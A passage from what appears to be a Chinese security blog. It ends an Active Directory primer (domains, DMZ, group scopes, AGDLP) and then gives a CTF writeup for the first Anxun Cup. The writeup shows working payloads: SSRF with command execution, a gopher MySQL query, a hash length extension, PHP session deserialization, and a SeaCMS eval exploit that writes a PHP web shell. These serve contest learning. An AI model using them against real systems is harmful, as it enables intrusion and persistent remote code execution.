title="逻辑结构"></a>逻辑结构</h3><ul><li>在活动口录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>“。</li><li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li></ul><p>a集团旗下有甲乙两个公司</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202828.png" alt=""></p><h3 id="活动目录的主要功能"><a href="#活动目录的主要功能" class="headerlink" title="活动目录的主要功能"></a>活动目录的主要功能</h3><ol><li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li><li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li><li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li><li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li><li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li><li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li></ol><h3 id="AD和DC的区别"><a href="#AD和DC的区别" class="headerlink" title="AD和DC的区别"></a>AD和DC的区别</h3><ul><li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li><li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li><li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>问题</strong>：</p><p>假如一个公司有200台电脑，我们希望某台电脑上的账户Alan可以访问每台电脑内的资源或者可以在每台电脑上登录。那么在“工作组”环境中，我们必须要在这200台电脑的各个SAM数据库中创建Alan这个账户。一旦Alan想要更换密码，必须要更改200次！现在只是200台电脑的公司，如果是有5000台电脑或者上万台电脑的公司呢？估计管理员会抓狂。</p><p><strong>答案:</strong></p><p>因此产生了域。在域环境中，只需要在活动目录中创建一次Alan账户，那么就可以在任意200台电脑中的一台上登录Alan，如果要为Alan账户更改密码，只需要在活动目录中更改一次就可以了。</p><h2 id="0x04-域相关概念"><a href="#0x04-域相关概念" class="headerlink" title="0x04 域相关概念"></a>0x04 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202914.png" alt=""></p><h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul><li>两个防火墙之间的空间被称为DMZ。</li><li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li><li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li><li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li><li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li></ul><h4 id="DMZ的屏障功能"><a href="#DMZ的屏障功能" class="headerlink" title="DMZ的屏障功能"></a>DMZ的屏障功能</h4><p>（1）内网可以访问外网<br>内网的用户需要白面地访间外网。在这一策略中，防火墙需要执行NAT。<br>（2）内网可以访间DMZ</p><p>此策略使内网用户可以使用或者管理DMZ中的服务器。<br>（3）外网不能访间内网<br>这是防火墙的基本等略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如栗要访问，就要通过vPN方式来进行。<br>（4）外网可以访问DMZ </p><p>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMz需要由防火墙完成对外地址到服务器实际地址的转换。<br>（5）DMZ不能访间内网<br>如不执行此策略，则当入侵者攻陷DMz时，内部网络将不会受保护。<br>（6）DMZ不能访何外网<br>此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作.</p><h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><p>域控制器</p><p>成员服务器</p><p>客户机</p><p>独立服务器</p><ul><li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li><li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li></ul><h2 id="0x05-域内权限解读"><a href="#0x05-域内权限解读" class="headerlink" title="0x05 域内权限解读"></a>0x05 域内权限解读</h2><h3 id="内权限解读"><a href="#内权限解读" class="headerlink" title="内权限解读"></a>内权限解读</h3><h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>域本地组，多域用户访问单域资源（访问同一个域）。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。</p><p>举例子说就是其他域都可以访问 asis.abc.com</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202615.png" alt=""></p><h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>全局组，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p><p>很多的全局组，可以把Domain Computers加入Domain Admins全局组中</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228203015.png" alt=""></p><h5 id="全局组与域本地组区别"><a href="#全局组与域本地组区别" class="headerlink" title="全局组与域本地组区别"></a>全局组与域本地组区别</h5><p>全局组相当于域账号，可以在全局使用，域本地组相当于本地账号，只能本机上使用。</p><p>下面我来举两个例子来进一步说明（以混合模式下为例）：</p><p>　　例1：将用户张三（域帐号Z3）加入到域本地组administrators中，并不能使Z3对非DC的域成员计算机有任何特权，但若加入到全局组Domain Admins中，张三就是域管理员了，可以在全局使用，对域成员计算机是有特权的。<br>　　例2：只有在域的DC上，对资源（如：文件/夹）设置权限，你可以指派域本地组administrators；但在非DC的域成员计算机上，你是无法设置域本地组administrators的权限的。因为它是域本地组，只能在DC上使用。</p><h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>通用组，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</p><h4 id="AGDLP"><a href="#AGDLP" class="headerlink" title="AGDLP"></a>AGDLP</h4><p>A (account):用户帐户<br>G (Global group):全局组<br>DL (Domain local group):域本地组<br>P (Permission):许可，资源权限<br>按照AGDLP的原则对用户进行组织和管理起来更容易<br>在AGDLP形成以后当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。</p><p>举个例子比如： 有两个域，A和B，A中的5个财务人员和B中的3个财务人员都需要访问B中的“FINA”文件夹。这时，可以在B中建一个DL(域本地组)，因为DL的成员可以来自所有的域，然后把这8个人都加入这个DL，并把FINA的访问权赋给DL。这样做的坏处是什么呢？因为DL是在B域中，所以管理权也在B域，如果A域中的5 个人变成6个人，那只能A域管理员通知B域管理员，将DL的成员做一下修改，B域的管理员太累了。这时候，我们改变一下，在A和B域中都各建立一个全局组（G），然后在B域中建立一个DL，把这两个G都加入B域中的DL中，然后把FINA的访问权赋给 DL。哈哈，这下两个G组都有权访问FINA文件夹了，是吗？组嵌套造成权限继承嘛！这时候，两个G分布在A和B域中，也就是A和B的管理员都可以自己管理自己的G啦，只要把那5个人和3个人加入G中，就可以了！以后有任何修改，都可以自己做了，不用麻烦B域的管理员！这就是A-G-DL-P。</p><p>A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><p>可以简单这样记忆：<br>域本地组：来自全林用于本域</p><p>全局组：来自本域作用于全林</p><p>通用组：来自全林用于全林</p><h3 id="熟悉各个组"><a href="#熟悉各个组" class="headerlink" title="熟悉各个组"></a>熟悉各个组</h3><p>本地域组的权限</p><ul><li>Administrators（管理员组） ————最重要的权限</li><li>Remote Desktop Users（远程登录组）</li><li>Print Operators（打印机操作员组）</li><li>Account Operators（帐号操作员组）</li><li>Server Operaters（服务器操作员组）</li><li>Backup Operators（备份操作员组）</li></ul><p>全局组、通用组的权限</p><ul><li>Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</li><li>Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</li><li>Schema Admins（架构管理员组）————最重要的权限</li><li>Domain Users（域用户组）</li></ul><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228203102.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第一届安洵杯writeup</title>
      <link href="/archis/6bd5dfde/"/>
      <url>/archis/6bd5dfde/</url>
      
        <content type="html"><![CDATA[<h1 id="第一届安洵杯writeup"><a href="#第一届安洵杯writeup" class="headerlink" title="第一届安洵杯writeup"></a>第一届安洵杯writeup</h1><h2 id="MIsc"><a href="#MIsc" class="headerlink" title="MIsc"></a>MIsc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>D0g3{4a8a08f09d37b73795649038408b5f33}</p><h3 id="CRC"><a href="#CRC" class="headerlink" title="CRC"></a>CRC</h3><p>第一个压缩包，提示CRC爆破结果是纯数字，直接爆破<br>里面三个文件，看了一下大概是要先解压password然后运行.py计算flag.zip的解压密码。<br>然后crc32碰撞，直接爆破password.txt的内容</p><pre><code class="python">import zlibfor i in xrange(0,100000000):    buf = str(i).rjust(8,&#39;0&#39;)    #print buf    if zlib.crc32(buf) &amp; 0xffffffff == 0x0cd95dac:        print &#39;&#39;,buf</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238690.039933.jpg" alt=""></p><p>然后再用.py跑</p><pre><code class="python">import base64import hashlib#f = open(&quot;password.txt&quot;,&#39;r&#39;)#password = f.readline()password=&#39;08646247&#39;b64_str = base64.b64encode(password.encode(&#39;utf-8&#39;))hash = hashlib.md5()hash.update(b64_str)zip_passowrd = hash.hexdigest()print(zip_passowrd)</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238706.8619618.jpg" alt=""></p><p>再去解压flag.zip,解压出来一张图片<br>改高度，先直接winhex改了过后图片直接崩了，然后绕了一会，结果就是该高度，winhex不对应该是crc的原因。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238750.618987.jpg" alt=""></p><p>修改高度为500</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238768.818335.jpg" alt=""></p><p>可以看到flag了导出 提取文字完事。<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238782.933626.jpg" alt=""></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>第一层绕过NOHO[]=d</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543160311.0840952.jpg" alt=""></p><p>第二层 </p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238815.5454066.jpg" alt=""></p><p>MD5加密后16进制转字符</p><p>MD5注入<br>ffifdyop</p><p>成功拿到flag</p><pre><code>e5e8b79aeb213ad6e0e4664e78aff61b</code></pre><p>参考文章<a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="external">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目提示</p><pre><code>The Intranets are in range 10.10.1.0/16Please use right protocols :)</code></pre><p>在name提交框那里随便提交一个test，发现输出到了url的url参数</p><p>于是利用burpsuite，使用http协议扫描一波内网主机</p><p>题外话:Intruder支持多种爆破模式。分别是：单一字典爆破、多字段相同字典爆破、多字典意义对应爆破、聚合式爆破。最常用的应该是在爆破用户名和密码的时候。使用聚合方式枚举了。选择不要搞错了</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238831.9874556.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238844.715426.jpg" alt=""></p><p>有<code>10.10.1.3</code>和<code>10.10.1.6</code>两台主机，利用同样的方法扫描端口，</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238855.3709393.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238953.0099094.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238897.1931283.jpg" alt=""></p><p>发现只有80端口，并且只有<code>10.10.1.6</code>主机才有d0g3.php，访问<code>10.10.1.6/d0g3.php</code>提示</p><pre><code>&lt;!--$_GET[d0g3]--&gt;</code></pre><p>传入</p><pre><code>http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo();</code></pre><p>发现执行了命令</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238980.8754137.jpg" alt=""></p><p>于是读取flag</p><pre><code>curl -v &#39;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo `cat flag.txt`; &#39;</code></pre><p>拿到flag</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239000.2885165.jpg" alt=""></p><pre><code>D0g3{SSRF_Is_So_Easy}</code></pre><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h3><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150165.3448315.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150269.1533902.jpg" alt=""></p><p>011000110110000101101001011100000110100101100001011011110011011000101110011110100110100101110000</p><p>hex(int(‘011000110110000101101001011100000110100101100001011011110011011000101110011110100110100101110000’,2))<br>‘0x6361697069616f362e7a6970’</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150336.3338537.jpg" alt=""></p><p>得到caipiao6.zip 下载审计</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239018.149764.jpg" alt=""></p><p>在api.php存在弱类型</p><pre><code class="php">for($i=0; $i&lt;7; $i++){    if($numbers[$i] == $win_numbers[$i]){        $same_count++;    }}</code></pre><ol><li><code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]}</code></li></ol><p>最终可以得到 Flag</p><p>D0g3{150754621171553}</p><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><h3 id="double-s-签到题"><a href="#double-s-签到题" class="headerlink" title="double-s 签到题"></a>double-s 签到题</h3><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543127815.6655116.jpg" alt=""></p><p><a href="http://54.200.169.99:7000/" target="_blank" rel="external">http://54.200.169.99:7000/</a></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543217010.3946216.jpg" alt=""></p><p><a href="http://54.200.169.99:7000/www.zip" target="_blank" rel="external">http://54.200.169.99:7000/www.zip</a></p><p>下载审计构造PHP反序列化</p><p>参考文章：<a href="http://hu3sky.ooo/2018/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="external">http://hu3sky.ooo/2018/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/?tdsourcetag=s_pctim_aiomsg</a></p><pre><code class="php">&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class Anti{    public $info;    function __construct()    {        $this-&gt;info = &#39;phpinfo();&#39;;    }    function __destruct()    {        eval($this-&gt;info);    }}if(isset($_GET[&#39;aa&#39;])){    if(unserialize($_GET[&#39;aa&#39;])==&#39;phpinfo&#39;)    {        $m = new Anti();    }}else{    header(&quot;location:index.html&quot;);}?&gt;</code></pre><p>这是一道PHP序列化漏洞的题，三种类型如下链接学习<br>（<a href="http://www.tuicool.com/articles/zEfuEz" target="_blank" rel="external">http://www.tuicool.com/articles/zEfuEz</a>）</p><p>可以看到<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p><p><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong></p><p>session.serialize_handler函数是用来设置session序列化引擎的。</p><p>这里是将session序列化引擎设置为php解析。我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p><p>先构造出一个phpinfo；</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543219057.63886.jpg" alt=""></p><pre><code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}</code></pre><p>由phpinfo()页面继续可知，session.upload_progress.enabled为On。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543218407.6353521.jpg" alt=""></p><p>通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543218369.4250176.jpg" alt=""></p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>传入<code>$_SESSION</code>数据的，这里就利用到了反序列化问题<br>考虑序列化</p><pre><code class="php">&lt;?phpclass Anti{    public $info=&#39;print_r(scandir(dirname(__FILE__)));&#39;;}$obj = new Anti();echo serialize($obj);?&gt;</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543217312.4219046.jpg" alt=""></p><pre><code>O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><pre><code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}print_r(scandir(dirname(FILE)));</code></pre><p><a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a></p><p>D0g3{Sim_Pl3_S3sSi0n}</p><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><pre><code class="php">&lt;?php@error_reporting(0);$flag = &quot;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;;$secret_key = &quot;xxxxxxxxxxxxxxxxxxxxxx&quot;; // the key is safe! no one can know except me$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];header(&quot;hash_key:&quot; . $hash_key);if (!empty($_COOKIE[&quot;getflag&quot;])) {    if (urldecode($username) === &quot;D0g3&quot; &amp;&amp; urldecode($password) != &quot;D0g3&quot;) {        if ($COOKIE[&quot;getflag&quot;] === md5($secret_key . urldecode($username . $password))) {            echo &quot;Great! You&#39;re in!\n&quot;;            die (&quot;&lt;!-- The flag is &quot;. $flag . &quot;--&gt;&quot;);        }        else {            die (&quot;Go out! Hacker!&quot;);        }    }    else {        die (&quot;LEAVE! You&#39;re not one of us!&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret_key . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    echo &quot;&lt;source_code&gt;&quot;;    }}?&gt;</code></pre><p>我们如果需要获得flag，需要满足一下条件：<br>1.Cookie中getflag的值不能为空<br>2.username必须为D0g3和password不能为D0g3<br>3.Cookie中的getmein必须等于<code>md5($secret.urldecode($username.$password))</code></p><pre><code>满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少`setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));`发现下面有行代码是这样写的，将输出的`md5($secret . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;))`作为cookie输出，结合前面的数据包我们可以知道输出的值为`c3ef608fdc59d9143c39664ade7556d5` 可是这串md5是由$secret+‘Doog3Dog3’转md5而得到的，如果我们在password输入D0g3将不满足前面所需的三个条件</code></pre><p>flag为，username为D0g3，password不可为D0g3，添加cookies，变量名为getflag，要求为：</p><p>c3ef608fdc59d9143c39664ade7556d5</p><p>安装hashdump</p><pre><code>git clone https://github.com/bwall/HashPumpyum install openssl-devel yum install gcc-c++cd HashPumpmakemake install</code></pre><p>利用hashpump来构造poc</p><pre><code>hashpumpInput Signature: c3ef608fdc59d9143c39664ade7556d5Input Data: D0g3Input Key Length: 20Input Data to Add: m15e64be7722f2e46d78d483264ebc5c8D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00m</code></pre><p>将\x改为%，将POST的username改为D0g3，password改为D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test，cookie加入getflag: </p><p>15e64be7722f2e46d78d483264ebc5c8<br>D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00m</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239040.2746198.jpg" alt=""></p><!-- The flag is D0g3{h4sh_1s_s0_diffic1ut_t0_me}--><h3 id="Diglett-蒙古"><a href="#Diglett-蒙古" class="headerlink" title="Diglett-蒙古"></a>Diglett-蒙古</h3><p><a href="http://54.200.169.99:7001/index.php?hu3debug=1" target="_blank" rel="external">http://54.200.169.99:7001/index.php?hu3debug=1</a></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239059.928092.jpg" alt=""></p><p>得到源码</p><pre><code>&lt;?php    include_once &quot;config.php&quot;;    if (isset($_POST[&#39;url&#39;])&amp;&amp;!empty($_POST[&#39;url&#39;]))    {        $url = $_POST[&#39;url&#39;];        if(preg_match(&#39;/file/&#39;,$url))        {             echo &quot;No hacker!&quot;;             echo &quot;&lt;/br&gt;&quot;;        }        $url2 = preg_replace(&#39;/file/&#39;,&#39;&#39;,$url);        $content_url = getUrlContent($url2);    }    else    {        $content_url = &quot;&quot;;    }    if(isset($_GET[&#39;hu3debug&#39;]))    {        show_source(__FILE__);    }    ?&gt;</code></pre><p>过滤了file尝试双写绕过</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239074.1999197.jpg" alt=""></p><p>读配置文件<br>url=fifilele://localhost/var/www/config.php</p><pre><code>&lt;?php$hosts = &quot;localhost&quot;;$dbusername = &quot;test_user&quot;;$dbpasswd = &quot;&quot;;$dbname = &quot;test&quot;;$dbport = 3306;$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);function initdb($conn){    $dbinit = &quot;create table if not exists flag(secret varchar(100));&quot;;    if(mysqli_query($conn,$dbinit)) return 1;    else return 0;}function safe($url){    $tmpurl = parse_url($url, PHP_URL_HOST);    if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)    {        var_dump($tmpurl);        die(&quot;&lt;h1&gt;&lt;p id=&#39;test1&#39;&gt;You are not the local!&lt;/p&gt;&lt;/h1&gt;&quot;);    }    return $url;}function getUrlContent($url){    $url = safe($url);    $url = escapeshellarg($url);    $pl = &quot;curl &quot;.$url;    echo $pl;    $content = shell_exec($pl);    return $content;}initdb($conn);?&gt;</code></pre><p>知道了mysql的配置内容 gopher一波<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239086.1100788.jpg" alt=""></p><pre><code>gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239095.9827178.jpg" alt=""></p><p>D0g3{G0ph1er_4nd_55rf_1s_1nt3rest1ng!}</p><h3 id="BOOM"><a href="#BOOM" class="headerlink" title="BOOM"></a>BOOM</h3><p>御剑扫目录</p><p>robots.txt和/admin/login.html，robots.txt里有/readme_.html，拿到了管理员用户名和错的密码</p><p>后台登录地址：<a href="http://222.18.158.227:10080/admin/login.html" target="_blank" rel="external">http://222.18.158.227:10080/admin/login.html</a><br>题目是boom就直接爆破吧，看题目描述应该是绕过这个验证码，刷新数字变大，估计是时间戳生成。<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239108.3526225.jpg" alt=""><br>但是测了一下可以直接空等于空绕过，然后直接intruder爆破<br>爆了很久的弱口令 结果是纯数字 很坑。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239118.7877207.jpg" alt="">登录拿flag</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239138.7812676.jpg" alt=""></p><p>70e052657cb40cf142883abaff266fee</p><h3 id="only-d0g3er-can-see-flag"><a href="#only-d0g3er-can-see-flag" class="headerlink" title="only d0g3er can see flag"></a>only d0g3er can see flag</h3><p><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="external">https://www.freebuf.com/vuls/150042.html</a></p><pre><code>http://138.68.2.14/seacms/search.phppost:searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;&amp;9[]=phpinfo();</code></pre><p>写shell</p><pre><code>searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=file_put_contents(&#39;../shell.php&#39;,&#39;&lt;?php%20@eval($_POST[c])?&gt;&#39;);</code></pre><p>提示.git泄露，用工具读出源码吧</p><p>\data\ common.inc.php有配置信息</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239162.399129.jpg" alt=""></p><p>直接写sql语句读取flag</p><pre><code>http://138.68.2.14/seacms/search.phpsearchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($Misplaced &amp;_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=$con =mysql_connect(&quot;localhost&quot;,&quot;d0g3&quot;,&quot;FlagIsHere&quot;);mysql_select_db(&quot;flag&quot;, $con);$result = mysql_query(&quot;SELECT * from flag&quot;);$row = mysql_fetch_array($result);var_dump($row);</code></pre><h3 id="Magic-Mirror"><a href="#Magic-Mirror" class="headerlink" title="Magic Mirror"></a>Magic Mirror</h3><p><a href="https://mp.weixin.qq.com/s/iLJEdzJSQD5cv66AftbJ3A" target="_blank" rel="external">https://mp.weixin.qq.com/s/iLJEdzJSQD5cv66AftbJ3A</a></p><p>Host: 